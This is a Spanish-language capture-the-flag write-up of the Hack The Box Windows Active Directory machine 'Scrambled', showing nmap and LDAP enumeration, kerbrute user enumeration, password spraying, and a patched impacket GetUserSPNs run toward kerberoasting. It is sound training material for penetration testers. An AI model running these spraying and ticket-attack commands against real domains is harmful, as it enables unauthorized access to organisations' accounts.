---
title: "Scrambled - WriteUp"
date: Wed Mar 19 2025 08:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, impacket, smb, powershell, ldap, windows, active-directory, iis]
image: /assets/img/htb-writeups/Pasted image 20241121093934.png
---

{% include machine-info.html
  machine="Scrambled"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Scrambled](/assets/img/htb-writeups/Pasted image 20241121093934.png)

Tags:  

------

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121093934.png)

 Scrambled es una máquina mediana de Windows Active Directory. Al enumerar el sitio web alojado en la máquina remota, un atacante potencial puede deducir las credenciales del usuario `ksimpson`. En el sitio web, también se indica que la autenticación NTLM está deshabilitada, lo que significa que se debe utilizar la autenticación Kerberos. Al acceder al recurso compartido `Public` con las credenciales de `ksimpson`, un archivo PDF indica que un atacante recuperó las credenciales de una base de datos SQL. Esto es un indicio de que hay un servicio SQL ejecutándose en la máquina remota. Al enumerar las cuentas de usuario normales, se descubre que la cuenta `SqlSvc` tiene un `Service Principal Name` (SPN) asociado a ella. Un atacante puede usar esta información para realizar un ataque que se conoce como `kerberoasting` y obtener el hash de `SqlSvc`. Después de descifrar el hash y adquirir las credenciales para la cuenta `SqlSvc`, un atacante puede realizar un ataque de `ticket plateado` para falsificar un ticket y hacerse pasar por el usuario `Administrador` en el servicio MSSQL remoto. La enumeración de la base de datos revela las credenciales del usuario `MiscSvc`, que se pueden usar para ejecutar código en la máquina remota mediante la comunicación remota de PowerShell. La enumeración del sistema como el nuevo usuario revela una aplicación `.NET`, que está escuchando en el puerto `4411`. La ingeniería inversa de la aplicación revela que está utilizando la clase insegura `Binary Formatter` para transmitir datos, lo que permite al atacante cargar su propia carga útil y obtener la ejecución del código como `nt authority\system`.

----
#### ENUMERACIÓN

NMAP
```perl
Nmap scan report for 10.10.11.168
Host is up (0.050s latency).

Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-21 08:44:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2024-11-21T08:48:05+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T08:48:05+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-11-21T08:48:05+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-21T08:34:16
|_Not valid after:  2054-11-21T08:34:16
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T08:48:05+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-21T08:48:05+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
58721/tcp open  msrpc         Microsoft Windows RPC
58746/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=11/21%Time=673EF30A%P=x86_64-pc-linux-gnu%
SF:r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_U
SF:NKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(F
SF:ourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COM
SF:MAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKN
SF:OWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,
SF:35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAN
SF:Desk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-21T08:47:29
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

Enumeramos LDAP:
```bash
$ ldapsearch -x -H ldap://10.10.11.168 -s base namingcontexts
```

``` bash
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
$ ldapsearch -x -H ldap://10.10.11.168 -b "DC=scrm,DC=local"
```

```bash
# extended LDIF
#
# LDAPv3
# base <DC=scrm,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Pero no obtenemos nada por ahora, necesitamos credenciales válidas.

WEB:
```
http://10.10.11.168/supportrequest.html
```

Investigando la web nos da una pista sobre un usuario:

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121111644.png)

Nos guardamos el usuario `ksimpson` para usarlo como punto de entrada.

Vamos a intentar enumerar usuarios con una lista que ya contenga `ksimpson` y con suerte descubriremos más usuarios. Para ello usaremos la herramienta `kerbrute`.

```bash
$ kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Usernames/kerberos_enum_userlists/A-ZSurnames.txt -o valid-users.txt
```

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121114544.png)

Y efectivamente, nos ha encontrado el usuario `ksimpsons` y cuatro más.

Nos creamos una lista con los usuario encontrados y la llamaremos "users.txt" por ejemplo.

Aunque la herramienta `kerbrute` ya te dice si el usuario es "kerberoasteable" vamos a asegurarnos que lo es con `GetNPUsers` de "impacket":
```bash
$ impacket-GetNPUsers scrm.local/ -no-pass -usersfile users.txt
```

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121115442.png)

Pues no hemos tenido suerte. Seguimos enumerando...

Vamos a copiar el contenido del archivo "users.txt" a otro archivo "pass.txt" convirtiendo todo a minúsculas y que usaremos como archivo de contraseñas y si el dominio tiene usuarios con malas prácticas como poner como password su mismo nombre de usuario podremos empezar a reventar la máquina.

Vamos a usar la herramienta `netexec` para realizar un "password-spray" con los dos archivos creados:

```bash
$ netexec smb 10.10.11.168 -u users.txt -p passwords.txt
```

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121120934.png)

Y por SMB no tenemos suerte. 

Vamos a probar con `kerbrute`, la pega que tenemos que probar una sola contraseña para una lista de usuarios. Después de probar combinaciones, encontramos un usuario válido!

```bash
$ kerbrute bruteuser --dc 10.10.11.168 -d scrm.local users.txt ksimpson
```

![SCRAMBLED](/assets/img/htb-writeups/Pasted image 20241121121156.png)

Bingo! Apuntamos las credenciales encontradas en el archivo "creds.txt" y seguimos.

Vamos a usar la versión 0.9.24 modificada de `GetUsersSPNs.py` ya que la actual no funciona este paso, para ello nos bajaremos esta versión específica de su [página oficial](https://github.com/fortra/impacket/releases/download/impacket_0_9_24/impacket-0.9.24.tar.gz) descomprimiremos el archivo y editaremos el archivo .py que corresponde. 

Editaremos la línea 260 donde dice:
```python
target = self.getMachineName()
```

Lo cambiamos por:
```python
target = self.__kdcHost
```

Guardamos el archivo y lo ejecutamos.

```bash
./GetUserSPNs.py scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local

Impacket v0.9.24 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2024-11-21 09:34:13.189179
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024-11-21 09:34:13.189179
```
---

**Última actualización**: 2025-03-19<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
